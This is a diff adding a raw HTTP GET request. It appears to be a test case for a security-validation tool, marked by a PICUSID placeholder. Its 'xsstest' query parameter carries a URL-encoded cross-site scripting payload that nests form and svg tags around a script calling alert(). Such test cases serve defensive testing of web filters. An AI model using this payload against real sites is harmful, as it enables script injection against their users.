@@ -1,0 +1,4 @@
+GET /page{PICUSID}/?xsstest=%3Cselect%3E%3Cbutton%3E%3Cselectedcontent%3E%3Cbutton%3E%3Coption%3E%3Csvg%3E%3Cscript%3Ealert%28%29%3Cfoo%3E HTTP/1.1
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
